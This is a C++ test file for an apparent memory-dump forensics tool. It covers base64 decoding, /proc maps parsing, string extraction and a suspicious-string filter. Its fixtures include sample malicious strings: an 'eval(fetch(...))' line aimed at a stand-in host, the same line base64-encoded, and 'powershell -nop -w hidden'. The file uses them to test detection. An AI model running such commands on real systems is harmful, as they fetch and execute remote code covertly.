#include "base64.hpp"
#include "memory_dumper.hpp"
#include "string_finder.hpp"

#include <chrono>
#include <exception>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <sstream>
#include <stdexcept>
#include <string>
#include <vector>

namespace {

void requireCheck(bool condition, const std::string& expression, int line) {
    if (!condition) {
        throw std::runtime_error(
            "check failed at line " + std::to_string(line) + ": " + expression
        );
    }
}

#define CHECK(expression) requireCheck(static_cast<bool>(expression), #expression, __LINE__)

#define CHECK_THROWS(expression)                                                     \
    do {                                                                             \
        bool thrown = false;                                                         \
        try {                                                                        \
            (void)(expression);                                                      \
        } catch (const std::exception&) {                                            \
            thrown = true;                                                           \
        }                                                                            \
        requireCheck(thrown, "throws: " #expression, __LINE__);                     \
    } while (false)

struct TestCase {
    std::string name;
    void (*body)();
};

std::filesystem::path makeTempDir() {
    const auto stamp = std::chrono::steady_clock::now().time_since_epoch().count();
    std::filesystem::path dir =
        std::filesystem::temp_directory_path() / ("jsfs_tests_" + std::to_string(stamp));
    std::filesystem::create_directories(dir);
    return dir;
}

std::string readText(const std::filesystem::path& path) {
    std::ifstream input(path);
    if (!input) {
        throw std::runtime_error("cannot read test artifact: " + path.string());
    }

    std::ostringstream buffer;
    buffer << input.rdbuf();
    return buffer.str();
}

void writeBinary(const std::filesystem::path& path, const std::string& bytes) {
    std::ofstream out(path, std::ios::binary);
    if (!out) {
        throw std::runtime_error("cannot write test artifact: " + path.string());
    }
    out.write(bytes.data(), static_cast<std::streamsize>(bytes.size()));
}

DumpedRegion makeDumpedRegion(const std::filesystem::path& file, std::uint64_t start) {
    DumpedRegion region;
    region.region.start = start;
    region.region.end = start + static_cast<std::uint64_t>(std::filesystem::file_size(file));
    region.region.permissions = "rw-p";
    region.region.path = "[test]";
    region.dumpFile = file;
    region.readableBytes = region.region.size();
    return region;
}

std::string makeSampleDumpBytes() {
    std::string bytes("noise\0", 6);
    bytes += "eval(fetch('http://example.test/path'))";
    bytes.push_back('\0');

    const std::string wide = "ActiveXObject";
    for (char ch : wide) {
        bytes.push_back(ch);
        bytes.push_back('\0');
    }

    return bytes;
}

void testBase64Payload() {
    CHECK(decodeBase64Strict("ZXZhbChmZXRjaCgnaHR0cDovL2V4YW1wbGUudGVzdCcpKQ==") ==
          "eval(fetch('http://example.test'))");
}

void testBase64Whitespace() {
    CHECK(decodeBase64Strict(" SGV sbG8= \n") == "Hello");
    CHECK(decodeBase64Strict("") == "");
}

void testBase64RejectsMalformedInput() {
    CHECK_THROWS(decodeBase64Strict("abc"));
    CHECK_THROWS(decodeBase64Strict("SGVsbG8=@"));
    CHECK_THROWS(decodeBase64Strict("===="));
}

void testMapsParserValidLine() {
    const auto parsed = parseMemoryMapLine(
        "00400000-00452000 r-xp 00000000 08:02 173521 /usr/bin/cat"
    );
    CHECK(parsed.has_value());
    CHECK(parsed->start == 0x00400000ULL);
    CHECK(parsed->end == 0x00452000ULL);
    CHECK(parsed->readable());
    CHECK(parsed->size() == 0x52000ULL);
    CHECK(parsed->path == "/usr/bin/cat");
}

void testMapsParserRejectsBadLines() {
    CHECK(!parseMemoryMapLine("not a maps line").has_value());
    CHECK(!parseMemoryMapLine("00452000-00400000 r--p 00000000 00:00 0").has_value());
    CHECK(!parseMemoryMapLine("xyz-00400000 r--p 00000000 00:00 0").has_value());
}

void testReadMapsFile() {
    const std::filesystem::path dir = makeTempDir();
    const std::filesystem::path maps = dir / "maps.txt";

    std::ofstream out(maps);
    out << "1000-2000 rw-p 00000000 00:00 0 [heap]\n";
    out << "bad line\n";
    out << "3000-3800 r--p 00000000 00:00 0 /tmp/sample\n";
    out.close();

    const std::vector<MemoryRegion> regions = MemoryDumper::readProcessMaps(maps);
    CHECK(regions.size() == 2);
    CHECK(regions[0].path == "[heap]");
    CHECK(regions[1].start == 0x3000ULL);
    CHECK_THROWS(MemoryDumper::readProcessMaps(dir / "missing.txt"));

    std::filesystem::remove_all(dir);
}

void testSuspiciousFilter() {
    CHECK(isSuspiciousString("prefix ActiveXObject suffix"));
    CHECK(isSuspiciousString("eval(fetch('http://example.test'))"));
    CHECK(isSuspiciousString("powershell -nop -w hidden"));
    CHECK(!isSuspiciousString("ordinary internal status message"));
}

void testStringExtractionAsciiAndUtf16() {
    const std::filesystem::path dir = makeTempDir();
    const std::filesystem::path dump = dir / "region.bin";
    writeBinary(dump, makeSampleDumpBytes());

    const DumpedRegion region = makeDumpedRegion(dump, 0x1000);
    const std::filesystem::path strings = dir / "strings.tsv";
    const std::filesystem::path hits = dir / "hits.tsv";

    const StringScanSummary summary = extractStrings({region}, strings, hits, {6, 100});
    CHECK(summary.asciiStrings >= 1);
    CHECK(summary.utf16Strings >= 1);
    CHECK(summary.suspiciousHits >= 2);
    CHECK(readText(strings).find("ActiveXObject") != std::string::npos);
    CHECK(readText(hits).find("eval(fetch") != std::string::npos);

    std::filesystem::remove_all(dir);
}

void testTrackedValueLocations() {
    const std::filesystem::path dir = makeTempDir();
    const std::filesystem::path dump = dir / "region.bin";
    writeBinary(dump, makeSampleDumpBytes());

    const DumpedRegion region = makeDumpedRegion(dump, 0x1000);
    const std::vector<TrackedValue> tracked = {
        {"payload", "eval(fetch('http://example.test/path'))", 0},
        {"missing", "definitely-not-present", 0}
    };

    const std::vector<TrackedLocation> locations = locateTrackedValues({region}, tracked, 4);
    CHECK(!locations.empty());
    CHECK(locations[0].name == "payload");
    CHECK(locations[0].address >= 0x1000ULL);
    CHECK(locateTrackedValues({region}, tracked, 0).empty());

    const std::filesystem::path report = dir / "tracked.tsv";
    writeTrackedLocations(report, locations);
    CHECK(readText(report).find("payload") != std::string::npos);

    std::filesystem::remove_all(dir);
}

void testExtractionErrors() {
    const std::filesystem::path dir = makeTempDir();
    DumpedRegion missing;
    missing.region.start = 0x1000;
    missing.region.end = 0x2000;
    missing.region.permissions = "rw-p";
    missing.dumpFile = dir / "missing.bin";

    CHECK_THROWS(extractStrings({missing}, dir / "strings.tsv", dir / "hits.tsv", {6, 10}));
    CHECK_THROWS(locateTrackedValues({missing}, {{"payload", "example", 0}}, 1));
    CHECK_THROWS(extractStrings({}, dir / "strings.tsv", dir / "hits.tsv", {0, 10}));

    const std::filesystem::path missingDir = dir / "missing" / "tracked.tsv";
    CHECK_THROWS(writeTrackedLocations(missingDir, {}));

    std::filesystem::remove_all(dir);
}

const std::vector<TestCase>& tests() {
    static const std::vector<TestCase> cases = {
        {"base64_payload", testBase64Payload},
        {"base64_whitespace", testBase64Whitespace},
        {"base64_rejects_malformed_input", testBase64RejectsMalformedInput},
        {"maps_parser_valid_line", testMapsParserValidLine},
        {"maps_parser_rejects_bad_lines", testMapsParserRejectsBadLines},
        {"read_maps_file", testReadMapsFile},
        {"suspicious_filter", testSuspiciousFilter},
        {"string_extraction_ascii_and_utf16", testStringExtractionAsciiAndUtf16},
        {"tracked_value_locations", testTrackedValueLocations},
        {"extraction_errors", testExtractionErrors}
    };
    return cases;
}

int runOne(const TestCase& test) {
    try {
        test.body();
        std::cout << "[ok] " << test.name << '\n';
        return 0;
    } catch (const std::exception& error) {
        std::cerr << "[fail] " << test.name << ": " << error.what() << '\n';
        return 1;
    }
}

} // namespace

int main(int argc, char** argv) {
    if (argc == 2) {
        const std::string requested = argv[1];
        for (const TestCase& test : tests()) {
            if (test.name == requested) {
                return runOne(test);
            }
        }

        std::cerr << "unknown test case: " << requested << '\n';
        return 2;
    }

    int failures = 0;
    for (const TestCase& test : tests()) {
        failures += runOne(test);
    }

    return failures == 0 ? 0 : 1;
}
